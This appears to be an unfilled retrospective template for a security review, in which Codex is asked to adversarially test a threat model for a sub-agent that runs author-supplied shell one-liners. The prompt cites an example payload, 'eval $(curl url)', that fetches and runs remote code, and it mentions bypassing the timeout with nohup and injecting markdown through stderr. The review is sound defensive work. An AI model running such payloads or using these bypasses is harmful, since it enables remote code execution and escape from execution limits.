# Spike VIII verifier ★ — Codex retro

**Date**: 2026-05-04
**Subject**: A4 SECURITY.md threat model + A3 verifier_execute_step2.md prompt body
**Bundle**: bundled/verifier (commit `a017133` post-A7)

## Codex prompt

> Spike VIII verifier ★ bundle introduces sub-agent Bash execution of an
> SCOPE.md-author-controlled completion one-liner. Threat model in
> bundled/verifier/SECURITY.md (~54 lines). Step 2 prompt in
> bundled/verifier/prompts/subagent/verifier_execute_step2.md. Cap = 500
> char + 30s timeout + 100KB output truncation. No metacharacter denylist.
>
> Challenge: are the cap+timeout+output-cap mitigations sufficient to
> contain T1 (destructive author payload)? Specifically:
> 1. Can a 500-char one-liner deliver a destructive payload that the cap
>    does not stop? (e.g. `eval $(curl url)` where url is short)
> 2. Are there bypass paths around `subprocess.run(timeout=30)`? (e.g.
>    `nohup` + background process — already documented as known limitation T6)
> 3. Is `text=True` + 100KB cap sufficient for binary-output commands
>    that might inject bytes downstream readers (VERIFY_REPORT.md
>    markdown injection via stderr sample)?
> 4. Anything we missed?
>
> Be adversarial. Returning 'looks fine' is failure mode.

## Findings

(To be filled after Codex retro dispatch — placeholders below.)

### Finding 1 — <title>
- **Codex quote**: "<verbatim>"
- **Severity**: Critical / Important / Minor / Documented non-goal
- **Resolution**: Amend SECURITY.md / Step 2 prompt / SKILL.md OR document as explicit non-goal

(repeat per finding)

## Verdict

(One of: "retro complete; 0 amendments" or "retro complete; N amendments applied")

## Files amended (if any)

(list, or "none")
